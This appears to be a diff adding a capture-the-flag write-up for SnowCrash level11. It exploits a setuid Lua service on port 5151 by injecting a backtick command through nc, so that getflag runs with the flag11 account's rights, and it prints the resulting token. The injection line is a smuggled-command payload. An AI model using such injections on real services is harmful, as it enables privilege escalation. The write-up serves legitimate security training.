@@ -1,0 +1,39 @@
+level11@SnowCrash:~$ ls -lA
+total 16
+-r-x------ 1 level11 level11  220 Apr  3  2012 .bash_logout
+-r-x------ 1 level11 level11 3518 Aug 30  2015 .bashrc
+-rwsr-sr-x 1 flag11  level11  668 Mar  5  2016 level11.lua
+-r-x------ 1 level11 level11  675 Apr  3  2012 .profile
+
+-----------------------------------------------------------------------------------------------------
+
+level11@SnowCrash:~$ ./level11.lua
+lua: ./level11.lua:3: address already in use
+stack traceback:
+	[C]: in function 'assert'
+	./level11.lua:3: in main chunk
+	[C]: ?
+
+We can see an error because the address is already used and with a 'top', we can see a lua script running
+
+-----------------------------------------------------------------------------------------------------
+
+We can write to all with the 'wall' shell command
+
+-----------------------------------------------------------------------------------------------------
+
+So we just have to send the return of getflag on lolhost 5151 with wall
+
+-----------------------------------------------------------------------------------------------------
+
+But we need to made the script execute it, because only it have the rights to get the flag:
+
+level11@SnowCrash:~$ echo '`getflag` | write level11 pts/0' | nc localhost 5151
+Password:
+Message from flag11@SnowCrash on (none) at 18:13 ...
+Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
+EOF
+Erf nope..
+
+The script said us << Erf nope.. >> cause the hash is a wrong track (NotSoEasy)
+But the 'write' command is here to print the output of 'getflag', which is executed with the rights of the script (as flag11)
